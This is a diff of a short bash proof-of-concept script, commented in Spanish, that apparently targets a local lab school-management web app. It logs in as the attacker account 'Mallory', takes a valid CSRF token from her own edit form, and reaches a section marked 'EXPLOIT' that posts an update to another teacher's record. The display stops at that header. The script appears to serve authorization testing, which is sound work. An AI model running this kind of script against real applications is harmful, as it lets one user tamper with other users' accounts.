@@ -1,6 +1,8 @@
 #!/usr/bin/env bash
 set -u
-D=/opt/homebrew/bin/docker
+# Requisito previo: tras 'migrate:fresh --seed', crear los docentes de laboratorio
+# (ver seccion 0 del documento): Mallory queda id=2 (atacante) y Victor id=3.
+D=${DOCKER:-docker}   # export DOCKER=/ruta/a/docker si no esta en el PATH
 B=http://localhost:8080
 CJ=/tmp/mal.txt
 rm -f "$CJ"
@@ -17,9 +19,9 @@ echo "login token len: ${#T}"
 curl -s -b "$CJ" -c "$CJ" -o /dev/null -w "POST /login -> %{http_code}\n" \
   -d "_token=$T" --data-urlencode "email=mallory@ut.com" --data-urlencode "password=password123" "$B/login"
 
-echo "===== token CSRF valido de sesion (desde el form propio de Mallory, id=3) ====="
-curl -s -b "$CJ" -o /tmp/edit3.html -w "GET edit/3 -> %{http_code}\n" "$B/teachers/edit/3"
-ETOK=$(cat /tmp/edit3.html | extract_token)
+echo "===== token CSRF valido de sesion (desde el form propio de Mallory, id=2) ====="
+curl -s -b "$CJ" -o /tmp/edit2.html -w "GET edit/2 -> %{http_code}\n" "$B/teachers/edit/2"
+ETOK=$(cat /tmp/edit2.html | extract_token)
 echo "edit token len: ${#ETOK}"
 
 echo "===== EXPLOIT: POST /school/teacher/update teacher_id=1 ====="
